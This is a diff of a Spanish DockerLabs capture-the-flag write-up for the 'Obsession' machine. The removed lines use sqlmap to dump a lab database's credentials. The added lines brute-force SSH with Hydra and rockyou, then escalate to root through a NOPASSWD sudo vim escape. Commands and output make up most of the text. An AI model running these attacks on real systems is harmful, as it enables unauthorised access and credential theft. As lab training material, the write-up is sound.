@@ -241,135 +241,66 @@ root
 ____________________________________________________________________________________________
 ### 2. ANALISIS HTTP
 La otra opción sería analizar el servicio web.  Para ello nos dirigimos al navegador y escribimos la dirección IP en el buscador.  Esto nos llevará a un sitio web de lo que parece ser publicidad deportiva con un formulario.
-![Formulario web]()
-![Respuesta de formulario]()
-```bash
-> sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
-[20:07:01] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 22.04 (jammy)
-web application technology: Apache 2.4.52
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[20:07:01] [INFO] fetching database names
-[20:07:01] [INFO] retrieved: 'information_schema'
-[20:07:01] [INFO] retrieved: 'register'
-[20:07:01] [INFO] retrieved: 'sys'
-[20:07:01] [INFO] retrieved: 'mysql'
-[20:07:01] [INFO] retrieved: 'performance_schema'
-available databases [5]:
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] register
-[*] sys
-
-[20:07:01] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0805pm.csv'
-
-[*] ending @ 20:07:01 /2025-09-07/
-```   
-* Con -u indicamos la url.
-* --forms le dice a sqlmap que busque formularios en la página (inputs, login forms, búsqueda, etc.) y trate de inyectar SQL allí.
-* Con --dbs indicamos que queremos listar las bases de datos disponibles si encuentra una inyección exitosa.
-* Con --batch indicamos a sqlmap que no nos pregunte  durante el ataque, sino que asuma respuestas por defecto. Es útil para automatizar el proceso en scripts o pruebas largas.
-
-Bien, hemos encontrado la base de datos *register* así que accedemos a ella y listamos las tablas que pueda haber.
-
-```bash
-> sqlmap -u http://172.17.0.2 --forms -D register --tables --batch
-[20:15:29] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 22.04 (jammy)
-web application technology: Apache 2.4.52
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[20:15:29] [INFO] fetching tables for database: 'register'
-[20:15:29] [INFO] retrieved: 'users'
-Database: register
-[1 table]
-+-------+
-| users |
-+-------+
-
-[20:15:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0815pm.csv'
-
-[*] ending @ 20:15:29 /2025-09-07/
-```
-Esto nos ha indicado que en esta base de datos hay una tabla que se llama *users*, la cual, sospechosamente, puede contener usuarios.  Ahora que ya tenemos la tabla, lo que nos interesa es conseguir las columnas, así que ejecutamos:
-```bash
-> sqlmap -u http://172.17.0.2 --forms -D register -T users --columns --batch
-[20:20:43] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 22.04 (jammy)
-web application technology: Apache 2.4.52
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[20:20:43] [INFO] fetching columns for table 'users' in database 'register'
-[20:20:43] [INFO] retrieved: 'username'
-[20:20:43] [INFO] retrieved: 'varchar(30)'
-[20:20:43] [INFO] retrieved: 'passwd'
-[20:20:43] [INFO] retrieved: 'varchar(30)'
-Database: register
-Table: users
-[2 columns]
-+----------+-------------+
-| Column   | Type        |
-+----------+-------------+
-| passwd   | varchar(30) |
-| username | varchar(30) |
-+----------+-------------+
-
-[20:20:43] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0820pm.csv'
-
-[*] ending @ 20:20:43 /2025-09-07/
-```
-Ya por último sería acceder a los datos de las dos columnas que hemos encontrado así que ejecutamos: 
-```bash
-> sqlmap -u http://172.17.0.2 --forms -D register -T users -C passwd,username --dump --batch
-[20:22:38] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 22.04 (jammy)
-web application technology: Apache 2.4.52
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[20:22:38] [INFO] fetching entries of column(s) 'passwd,username' for table 'users' in database 'register'
-[20:22:38] [INFO] retrieved: 'KJSDFG789FGSDF78'
-[20:22:38] [INFO] retrieved: 'dylan'
-Database: register
-Table: users
-[1 entry]
-+------------------+----------+
-| passwd           | username |
-+------------------+----------+
-| KJSDFG789FGSDF78 | dylan    |
-+------------------+----------+
-
-[20:22:38] [INFO] table 'register.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'
-[20:22:38] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0822pm.csv'
-
-[*] ending @ 20:22:38 /2025-09-07/
-```
-* Con --dump volcamos la información de las columnas que acabamos de inyectar.
-
-Vemos que nos ha devuelto un usuario *dylan* y una contraseña *KJSDFG789FGSDF78* así que lo probaremos en el formulario web a ver que sucede.  En este caso nos devuelve a la misma página de *http://172.17.0.2/acceso_valido_dylan.php* que hemos visto en la primera forma de resolver esta máquina así que, a partir de aquí el resto de la máquina será igual.
+![Formulario web](https://github.com/JavieRR13/WriteUps/blob/732ee0b53c59afd90749ba2666027c41e7664fc9/DockerLabs/Muy%20f%C3%A1cil/Obsession/Im%C3%A1genes/Obsession_Formulario.png)
+![Respuesta de formulario](https://github.com/JavieRR13/WriteUps/blob/9717500d543ffa09527e2a768192a00d5048122a/DockerLabs/Muy%20f%C3%A1cil/Obsession/Im%C3%A1genes/Obsession_Respuesta.png)
+El código fuente que podemos observar es muy simple y no parece haber nada de donde podamos sacar nada.  Ahora podríamos intentar utilizar [BurpSuite](https://portswigger.net/burp) para interceptar peticiones pero, antes de eso, vamos que el nombre *Russoski* se repite mucho así que sería buena opción comprobar si es un usuario válido de sistema.
 
 (------------------------------------A PARTIR DE AQUÍ, LA FORMA DE ESCALAR PRIVILEGIOS SERÁ LA MISMA------------------------------------)
+Haremos uso de la herramienta de fuerza bruta [Hydra](https://github.com/vanhauser-thc/thc-hydra) utilizando *russoski* como nombre de usuario y el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
+```py
+❯ hydra -l russoski -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 12:53:49
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
+[STATUS] attack finished for 172.17.0.2 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 12:54:21
+```
+* Con -l seleccionamos el usuario.
+* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
+* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
 
+Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *russoski*.
+Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
+```ruby
+❯ ssh russoski@172.17.0.2
+russoski@172.17.0.2's password: 
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)
 
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
 
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
 
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Sep 16 13:15:06 2025 from 172.17.0.1
+russoski@9cc448a7c0a7:~$ whoami
+russoski
+``` 
 
+Una vez dentro de la máquina víctima, vamos a intentar listar todos los privilegios de sudo del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo. 
+```ruby
+russoski@9cc448a7c0a7:~$ sudo -l
+Matching Defaults entries for russoski on 9cc448a7c0a7:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
+User russoski may run the following commands on 9cc448a7c0a7:
+    (root) NOPASSWD: /usr/bin/vim
+```
+Sabiendo que podemos ejecutar Vim[^1] con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
+![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/15cc9e2a9780218e32fb4a67bedf059c0229067a/DockerLabs/Muy%20f%C3%A1cil/Obsession/Im%C3%A1genes/Obsession_GTFOBinsvim.png)
+```ruby
+russoski@9cc448a7c0a7:~$ sudo vim -c ':!/bin/sh'
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# whoami
+root
+# 
+```
 🥳CONSEGUIDO, SOMOS ROOT🥳
+[^1]: Vim es un editor de texto para sistemas Unix/Linux que, al poder ejecutarse con sudo, se convierte en una vía de escalada de privilegios porque permite lanzar comandos de sistema desde dentro del editor (por ejemplo con :!bash), lo que posibilita abrir una shell con permisos de root.
